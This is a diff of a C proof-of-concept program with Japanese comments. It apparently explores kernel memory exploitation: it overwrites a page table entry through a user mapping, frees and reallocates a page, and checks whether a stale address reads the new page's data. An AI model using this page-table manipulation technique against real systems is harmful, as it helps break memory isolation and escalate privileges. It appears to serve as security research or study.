@@ -89,13 +89,28 @@ int main() {
     printf("[+] at %p: %lx\n", (unsigned long *)pbuf_mapping + 1, *((unsigned long *)pbuf_mapping + 1));
 
     // PTE 書き換え
-    // *(unsigned long *)pbuf_mapping = 0x800000012a2d4867UL;
+    *(unsigned long *)pbuf_mapping = *((unsigned long *)pbuf_mapping + 1);
 
-    // キャッシュクリア
-    // asm volatile("clflush (%0)" : : "r" (addr_2) : "memory");
-    // asm volatile ("mfence" : : : "memory");
+    // 'b'を格納したページを解放
+    printf("[+] release a page\n");
+    if (munmap((char *)addr_2 + PAGE_SIZE, PAGE_SIZE) == -1) perror("munmap() failed");
 
-    // getchar();
+    // 新たなページを確保
+    void *new_page = mmap(
+        NULL,
+        FOUR_KILO,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
+        -1,
+        0
+    );
+
+    // 新たに確保したページに値を書きこむ
+    *(char *)new_page = 'c';
+
+    getchar();
+
+    printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
 
     // メモリの解放関連
     if (munmap(two_mega_1, FOUR_MEGA) == -1) perror("munmap() failed");
